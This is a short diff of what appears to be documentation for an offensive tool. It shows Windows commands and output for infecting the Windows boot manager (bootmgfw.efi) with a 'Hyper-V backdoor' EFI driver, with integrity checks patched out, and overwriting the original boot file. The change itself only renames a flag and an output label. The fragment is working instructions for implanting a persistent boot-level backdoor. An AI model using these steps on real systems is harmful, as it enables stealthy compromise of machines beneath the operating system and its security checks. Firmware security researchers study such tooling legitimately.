@@ -157,12 +157,12 @@ C:\> copy S:\EFI\Microsoft\Boot\bootmgfw.efi S:\EFI\Microsoft\Boot\bootmgfw_orig
 Infect original image file with Hyper-V backdoor:
 
 ```
-C:\> python .\infector.py --patch-integrity-checks --payload .\DmaBackdoorHv_X64.efi ^ 
+C:\> python .\infector.py --patch-integrity-checks --driver .\DmaBackdoorHv_X64.efi ^ 
      --infect S:\EFI\Microsoft\Boot\bootmgfw_orig.efi ^
      --output S:\EFI\Microsoft\Boot\bootmgfw.efi
 
 [+] Target image to infect: S:\EFI\Microsoft\Boot\bootmgfw_orig.efi
-[+] Infector payload: .\DmaBackdoorHv_X64.efi
+[+] DXE driver: .\DmaBackdoorHv_X64.efi
 [+] Output file: S:\EFI\Microsoft\Boot\bootmgfw.efi
 Original entry point RVA is 0x0001fbd0
 Original .reloc virtual size is 0x00000d80
